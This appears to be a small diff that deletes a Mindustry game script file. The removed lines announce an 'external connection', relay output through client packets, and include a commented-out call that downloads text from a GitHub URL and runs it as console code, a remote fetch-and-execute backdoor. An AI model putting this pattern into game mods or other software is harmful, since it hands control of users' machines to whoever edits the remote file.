@@ -1,8 +1,0 @@
-Call.sendMessage("已开启外部连接 ");
-
-var _x9 = {
-print:function(e){Call.clientPacketReliable("144_",e)}
-}
-/*
-  Http.get("https://raw.githubusercontent.com/336699c/test/main/store_data.txt",e=>{Vars.mods.scripts.runConsole(e.getResultAsString())})
-*/
